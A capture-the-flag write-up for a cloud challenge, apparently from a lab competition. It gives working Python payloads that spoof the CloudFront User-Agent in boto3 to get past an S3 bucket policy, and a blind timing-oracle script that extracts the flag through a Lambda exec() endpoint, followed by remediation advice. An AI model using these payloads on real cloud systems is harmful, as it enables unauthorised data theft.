# ☁️ Cloud Escape CTF — Stage 2: "Miss Me Yet?"
## Write-Up by Agent freecandy

---

## 📋 Challenge Overview

| Field | Value |
|---|---|
| **Challenge** | Miss Me Yet? — Stage 2 |
| **Points** | 150 |
| **Target Execution API** | `https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec` |
| **CloudFront UI** | `https://d4ysu55xg7wfi.cloudfront.net/` |
| **Region** | `us-east-1` |

---

## 🔍 Phase 1: Front-End Investigation & Policy Leak

### 1.1 Discovering the Docs

The challenge provided a CloudFront distribution path hosting a simple website interface. During directory busting and path scanning, we discovered the `/docs.html` file. 

This document inadvertently revealed the full S3 Bucket Policy for the site bucket (`site781fe43f26b9eba3`).

### 1.2 Analyzing the Leaked Bucket Policy (CRITICAL)

The leaked policy revealed significant access control constraints:

```json
{
    "Sid": "Statement1",
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": [
        "arn:aws:s3:::site781fe43f26b9eba3/index.html",
        "arn:aws:s3:::site781fe43f26b9eba3/docs.html",
        "arn:aws:s3:::site781fe43f26b9eba3/junior_developer.png"
    ],
    "Condition": {
        "StringEquals": {
            "aws:UserAgent": "Amazon CloudFront"
        }
    }
},
{
    "Sid": "Statement2",
    "Effect": "Allow",
    "Principal": "*",
    "Action": ["s3:GetObject", "s3:ListBucket"],
    "Resource": ["arn:aws:s3:::site781fe43f26b9eba3/*"],
    "Condition": {
        "StringEquals": {
            "aws:SourceVpc": "vpc-09328d3fa21dce320",
            "aws:UserAgent": "Amazon CloudFront"
        }
    }
}
```

**Policy Analysis:**
- **Statement 1** allows access to specific files as long as the `User-Agent` is `Amazon CloudFront`.
- **Statement 2** allows access to **ANY file** in the bucket, but strictly requires the request to originate from `vpc-09328d3fa21dce320` **AND** contain the `Amazon CloudFront` User-Agent.

---

## 🕵️ Phase 2: Arbitrary Code Execution (Code_Exec API)

### 2.1 The Code Exec API
We interacted with an AWS API Gateway at `/dev/code_exec`, which passed base64 encoded Python code directly into a Lambda `exec()` context.

**Payload Format:**
```json
{
  "code": "YmFzZTY0X2VuY29kZWRfcHl0aG9uX2NvZGU="
}
```

### 2.2 Blind Constraints

The Lambda environment proved extremely restrictive:
1. **Strict Binary Responses:**
   - Success returned: `{"result":"Code executed successfully"}`
   - Any exception/crash returned: `{"error":"Something went wrong!"}`
   - **No standard output (`stdout`)** was captured or returned.
2. **Network Isolation:** 
   - No NAT Gateway, so no direct internet access for OOB (Out of Band) HTTP connections.
   - The S3 Gateway Endpoint was not configured for standard `boto3` requests, meaning any AWS API requests timed out unless explicitly directed to a local VPC endpoint or carefully managed.
3. **IAM Constraints:** The Lambda's execution role did not have S3 write permissions to leak data outward.

---

## 🎯 Phase 3: Bypassing the Bucket Policy

To read the highly restricted `flag` file in `site781fe43f26b9eba3`, our code had to run from within the VPC (which the Lambda did natively) **and** inject the `User-Agent: Amazon CloudFront` header required by `Statement2`.

### 3.1 Boto3 Header Injection

We crafted a Python payload that uses a `boto3` event hook to forcefully overwrite the `User-Agent` on the outgoing signed request before it hits the S3 endpoint.

```python
import boto3

def set_ua(request, **kwargs):
    request.headers['User-Agent'] = 'Amazon CloudFront'

s3 = boto3.client('s3', region_name='us-east-1')
s3.meta.events.register('before-send.s3.*', set_ua)

# We can now read any object in the bucket!
res = s3.get_object(Bucket='site781fe43f26b9eba3', Key='flag')
flag_content = res['Body'].read().decode('utf-8')
```

---

## ⏱️ Phase 4: Exploitation — High-Precision Timing Side-Channel

Because `stdout` is discarded and we cannot write the flag outward, we implemented a **Blind Timing Oracle**. 
Since API Gateway requests process synchronously, we can induce a sleep in the Lambda if our guess for a flag character is correct.

### 4.1 Oracle Logic

If `flag_content[pos] == guess`:
- Induce `time.sleep(2.0)`
- Total API response time increases to **> 9.0 seconds**.

If `flag_content[pos] != guess`:
- Exit normally.
- Total API response time remains **< 5.0 seconds**.

### 4.2 Automated Python Oracle Payload

```python
import time
import boto3
import sys

def set_ua(request, **kwargs):
    request.headers['User-Agent'] = 'Amazon CloudFront'

s3 = boto3.client('s3', region_name='us-east-1')
s3.meta.events.register('before-send.s3.*', set_ua)

try:
    res = s3.get_object(Bucket='site781fe43f26b9eba3', Key='flag')
    flag = res['Body'].read().decode('utf-8').strip()
    
    # Check if the length matches first
    if len(flag) == 7:
        # Check specific character
        if flag[{POS}] == '{CHAR}':
            time.sleep(2.0)
except Exception as e:
    pass
```

We encoded this payload, sent it to the API, and measured the round-trip HTTP timing.

---

## 📡 Phase 5: Exfiltration Results

Using a multi-threaded Python script, we iterated over positions 0 to 6 and successfully extracted the flag in just a few minutes.

**Extraction Timing Metrics:**
```text
[Pos 0] = '0' (9.92s)
[Pos 1] = '1' (9.99s)
[Pos 2] = '0' (8.77s)
[Pos 3] = '2' (13.89s)
[Pos 4] = '0' (9.61s)
[Pos 5] = '1' (9.84s)
[Pos 6] = '3' (9.01s)
```

---

## 🏴 Flag

**`0102013`**

---

## 📚 Key Takeaways & Remediation

| Vulnerability | Impact | Fix |
|---|---|---|
| Unsafe Execution (`exec()`) | Remote Code Execution | Do not accept arbitrary code strings. Use predefined parameterized functions instead. |
| Inadequate Network Isolation | Lateral Movement inside VPC | Isolate Lambda via stringent Security Groups restricting outbound flow even within the VPC. |
| IAM Bucket Policy Flaws | Header verification is easily bypassed | `aws:UserAgent` should NEVER be used as a primary security perimeter. Rely on `aws:PrincipalArn` for strong identity verification. |
| Timing Oracle Leakage | Data Exfiltration | Implement fixed-time responses, asynchronous processing (SQS queues), or strict API Gateway timeouts (e.g., 2 seconds). |

---

*Write-up by Agent freecandy — Cloud Escape CTF 2026*
